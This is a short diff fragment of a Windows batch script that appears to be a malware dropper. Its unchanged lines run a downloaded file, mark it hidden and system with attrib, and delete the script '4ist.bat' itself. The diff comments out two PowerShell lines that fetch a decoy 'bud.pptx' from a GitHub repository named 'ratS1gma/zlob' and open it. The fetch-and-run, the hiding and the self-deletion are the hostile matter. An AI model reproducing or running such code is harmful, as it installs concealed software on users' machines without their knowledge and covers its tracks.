@@ -32,8 +32,8 @@ powershell -command "& {attrib +h +s %outputFilePath%}"
 echo Executing the downloaded file: %outputFilePath%
 start "" "%outputFilePath%"
 
-powershell Invoke-WebRequest -Uri "https://github.com/ratS1gma/zlob/raw/refs/heads/main/bud.pptx" -OutFile "%USERPROFILE%\Downloads\bud.pptx"
-powershell Start-Process -FilePath "%USERPROFILE%\Downloads\bud.pptx"
+::powershell Invoke-WebRequest -Uri "https://github.com/ratS1gma/zlob/raw/refs/heads/main/bud.pptx" -OutFile "%USERPROFILE%\Downloads\bud.pptx"
+::powershell Start-Process -FilePath "%USERPROFILE%\Downloads\bud.pptx"
 
 del %USERPROFILE%\Downloads\4ist.bat
 
